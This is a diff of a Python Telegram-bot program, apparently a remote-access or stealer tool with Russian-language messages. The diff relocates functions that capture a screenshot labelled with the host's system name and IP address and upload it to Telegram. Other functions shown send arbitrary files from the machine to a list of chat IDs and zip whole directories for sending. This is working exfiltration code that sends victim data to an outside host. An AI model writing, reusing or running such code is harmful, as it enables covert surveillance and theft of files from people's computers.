@@ -1,3 +1,21 @@
+def send_message_to_group(chat_id, screenshot):
+    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
+    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
+    image_buffer = BytesIO()
+    screenshot.save(image_buffer, format='JPEG')
+    image_buffer.seek(0)
+    files = {'photo': ('screenshot.jpg', image_buffer)}
+    response = requests.post(url, data=data, files=files)
+def send_file_to_telegram(file_path, file_name):
+    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
+    for chat_id in chat_ids:
+        files = {'document': (file_name, open(file_path, 'rb'))}
+        data = {'chat_id': chat_id}
+        response = requests.post(url, files=files, data=data)
+        if response.status_code != 200:
+            bot.send_message(chat_id, 'ОШИБКА БРАТИШ ХЗ ПОПРОБУЙ ЕЩЕ')
+            print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
+            print(response.text)
 @bot.message_handler(commands=['url'])
 def list_dir(message):
     chat_id = message.chat.id
@@ -284,24 +302,7 @@ def start(message):
     itembtn11 = types.KeyboardButton('/code')
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
-def send_message_to_group(chat_id, screenshot):
-    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
-    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
-    image_buffer = BytesIO()
-    screenshot.save(image_buffer, format='JPEG')
-    image_buffer.seek(0)
-    files = {'photo': ('screenshot.jpg', image_buffer)}
-    response = requests.post(url, data=data, files=files)
-def send_file_to_telegram(file_path, file_name):
-    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
-    for chat_id in chat_ids:
-        files = {'document': (file_name, open(file_path, 'rb'))}
-        data = {'chat_id': chat_id}
-        response = requests.post(url, files=files, data=data)
-        if response.status_code != 200:
-            bot.send_message(chat_id, 'ОШИБКА БРАТИШ ХЗ ПОПРОБУЙ ЕЩЕ')
-            print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
-            print(response.text)
+
 def create_zip_archive(source_dir, output_zip):
     try:
         with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
